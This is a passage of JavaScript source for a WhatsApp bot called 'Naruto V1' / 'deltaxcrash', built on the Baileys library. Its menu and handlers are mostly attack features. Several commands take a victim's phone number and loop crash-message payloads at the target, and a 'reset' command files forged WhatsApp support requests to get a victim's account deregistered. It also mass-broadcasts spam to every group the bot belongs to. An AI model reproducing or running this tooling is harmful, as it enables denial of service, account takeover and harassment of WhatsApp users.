"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/4a302cf6435ee7760bb0b.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
deltaxcrash.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
deltaxcrash.groupParticipantsUpdate(m.chat, [sender], 'delete')
deltaxcrash.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'menu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `
 ❄ *𝒘𝒂𝒈𝒘𝒂𝒏* @${sender.split("@")[0]}

    𝐍𝐀𝐑𝐔𝐓𝐎-𝐕1
ᯤ  𝐧𝐚𝐦𝐞 : ${pushname}
ᯤ  𝐜𝐚𝐬𝐞 : ${isPremium ? "Premium" : "Free"}
ᯤ  𝐜𝐫𝐞𝐚𝐭𝐨𝐫 : 𝑬𝒅𝒏𝒖𝒕001
└─☯

> ${run} 
  𝑶𝒘𝒏𝒆𝒓 𝒎𝒆𝒏𝒖
ᯤ  ${prefix}𝐬𝐞𝐥𝐟
ᯤ  ${prefix}𝐩𝐮𝐛𝐥𝐢𝐜
ᯤ  ${prefix}𝐚𝐝𝐝𝐩𝐫𝐞𝐦 234xx
ᯤ  ${prefix}𝐝𝐞𝐥𝐩𝐫𝐞𝐦 234xx
ᯤ  ${prefix}𝐚𝐝𝐝𝐨𝐰𝐧𝐞𝐫 234xx
ᯤ  ${prefix}𝐝𝐞𝐥𝐨𝐰𝐧𝐞𝐫 234xx
╰ ☯
  𝑷𝒖𝒃𝒍𝒊𝒄 𝒎𝒆𝒏𝒖
ᯤ  ${prefix}𝐩𝐢𝐧𝐠
ᯤ  ${prefix}𝐫𝐮𝐧𝐭𝐢𝐦𝐞
ᯤ  ${prefix}𝐬𝐜𝐫𝐢𝐩𝐭 <sc>
ᯤ  ${prefix}𝐚𝐥𝐢𝐯𝐞
ᯤ  ${prefix}𝐨𝐰𝐧𝐞𝐫
╰ ☯
  𝑩𝒖𝒈 𝒎𝒆𝒏𝒖
ᯤ  ${prefix}𝐯𝐢𝐫𝐮𝐬999 234xx
ᯤ  ${prefix}𝐫𝐞𝐬𝐭𝐚𝐫𝐭-𝐦𝐚𝐤𝐞𝐫 234xx
ᯤ  ${prefix}𝐜𝐥𝐞𝐚𝐫-𝐝𝐚𝐭𝐚 234xx
ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐯𝐢𝐫𝐮𝐬 234xx
ᯤ  ${prefix}𝐜𝐫𝐚𝐬𝐡-𝐭𝐨𝐭𝐚𝐥 234xx
ᯤ  ${prefix}𝐬𝐚𝐭𝐚𝐧𝐢𝐜999 234xx
ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨𝐜𝐫𝐚𝐬𝐡 234xx
╰☯
  𝑩𝒖𝒈 𝒈𝒓𝒐𝒖𝒑𝒔
ᯤ  ${prefix}𝐫𝐞𝐛𝐨𝐨𝐭 234xx
ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭 234xx
ᯤ  ${prefix}🗿 234xx
ᯤ  ${prefix}🔥 234xx
ᯤ  ${prefix}𝐛𝐮𝐠-𝐠𝐜 <linkgroup>
ᯤ  ${prefix}𝐮𝐢-𝐠𝐫𝐮𝐩 <linkgroup>
ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭-𝐠𝐜 <linkgroup>
ᯤ  ${prefix}𝐤𝐢𝐥𝐥-𝐠𝐜 <120###@g.us>
╰☯
  𝑽𝒊𝒑 𝒃𝒖𝒈𝒔
ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐧𝐨𝐯𝐨 <234xx, amount>
ᯤ  ${prefix}𝐯𝐢𝐫𝐮𝐬-𝐢𝐝 <234xx, amount>
ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭-𝐮𝐢 <234xx, amount>
ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐜𝐫𝐚𝐬𝐡1 <234xx, amount>
ᯤ  ${prefix}𝐫𝐚𝐬𝐞𝐧𝐠𝐚𝐧1 <234xx, amount>
ᯤ  ${prefix}𝐫𝐚𝐬𝐞𝐧𝐠𝐚𝐧 <234xx, amount>
╰☯
> ©® 𝑬𝒅𝒏𝒖𝒕 `
           deltaxcrash.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'nαrutσ crαsh🤫☸',
                            //body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/aa087aefb9d46573d21a5.jpg', 
                            sourceUrl: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
                            //sourceUrl: global.isLink,
                            previewType: "PHOTO", 
                            mediaType: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
                            renderLargerThumbnail: false
                        }
                    }
                }, {
                    quoted: m
                    })
     await deltaxcrash.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: false
                    }, {
                        quoted: m
                    })
                }
             break
case "alive":

const audiovn = "./Alive.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒔𝒉𝒊𝒏𝒐𝒃𝒊 𝒗𝒊𝒍𝒍𝒂𝒈𝒆 🤭",
          body: "kєєp lσvíng nαrutσ",
          thumbnailUrl: "https://telegra.ph/file/b03a5805307e23e92151c.jpg",
          sourceUrl: "https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


await deltaxcrash.sendMessage(m.chat, dooc, {quoted: m});


break;
		
case 'owner': case 'botowner':
let namaown = `Owner Cakep`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${owner}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${owner}\nitem1.TEL;waid=${global.owner}:+${global.owner}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝔈𝔡𝔫𝔲𝔱 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐸𝑑𝑛𝑢𝑡 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
deltaxcrash.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break

case 'restart': {
if (!isDeveloper) return joreply(mess.owner)
joreply(`bye🖐`)
await sleep(5000)
process.exit()
}
break		

case 'reset': {
if (!isPremium) return reply(mess.premium)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "IPHONE")
form.append("your_message", `"REGISTRATION", Saya tidak menerima kode pendaftaran pada nomor ini, tolong pulihkan `)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "5")
form.append("__hs", "19858.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(
`🗂️Reset Sucess Tunggu, Tunggu 1 - 48 Jam👌.

!Note: Kami Tidak Menjamin Kode otp Anda Akan dapat dikirim lagi.
# Account : ${targetnya}
`
)
} else if (payload.includes(`"payload":false`)) {
reply(
`
Payload.include(" payload": false )

❗🗣️: Reset Gagal, Kemungkinan Sedang Limit
`
)
} else reply(util.format(res.data))
} catch (err) {m.reply(`Fitur ini memerlukan persetujuan owner tools deltacrash`)}
} else reply(' Fitur ini memerlukan persetujuan owner tools deltacrash')
}
break



case 'gfsCdgsGsGs-blank': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
case 'reboot': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀`)
}
break
case "xhu":{
//if (!isRegistered) return registerbut(noregis)
if (!isPremium) return reply(mess.only.premium)
if (!isOwner) return reply(mess.only.owner)
let ntahlahh9 = `./lib/IMLEK.mp3`
let getGroups = await deltaxcrash.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let data = groupss.map((v) => v.id)

let teks22 = `LIST HARGA PANEL DELTACRASH\n\n 8 GB 5K \n UNLI 10K\n\n spesifikasi panel\n ram 16 gb\n room 200 gb \n anti delay`
const buf = await getBuffer(`https://telegra.ph/file/d725cb646cb63f7559486.jpg`)
for (let x of data) {
await deltaxcrash.sendMessage(x, {audio: fs.readFileSync(ntahlahh9), mimetype:'audio/mpeg', ptt: true }, m)
await deltaxcrash.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: false }, image: buf, caption: teks22 })
await sleep(100)
}
reply(`Success send broadcast message to ${data.length} groups chats`)
}
break
case 'CN892BB1 ': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
case 'ping': {
  const startTime = new Date();
  const pingMsg = await deltaxcrash.sendMessage(m.chat, { text: '*𝒏𝒂𝒓𝒖𝒕𝒐*' });

 await deltaxcrash.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `*𝐯𝐨𝐥𝐭𝐚𝐠𝐞 𝐬𝐩𝐞𝐞𝐝 ➽* ${new Date() - startTime} 𝐦𝐬`
        }
      }
    }, {});
  } 
break;	
case 'runtime':
                let pinga = ` ◈☃ 𝐍𝐀𝐑𝐔𝐓𝐎 𝐕1◈𝖗 Is Active${runtime(process.uptime())}`
                deltaxcrash.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝒏𝒂𝒓𝒖𝒕𝒐𝒗1`,
                            body: `вч єdnut hímsєlf❄`,
                            thumbnailUrl: 'https://telegra.ph/file/1491e0c7d9236f18d5f5f.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
case 'gfsCdgsGsGs': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀`)
}
break
case 'gfsCdgsGsGs': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀`)
}
break
case 'gfsCdgsGsGs': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283123456789`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await deltaxcrash.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283123456789`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "jids-unexpected": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣", 
    [whatsappNumber]
  );
}
break;
case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "jids-toui": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "jids-external": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
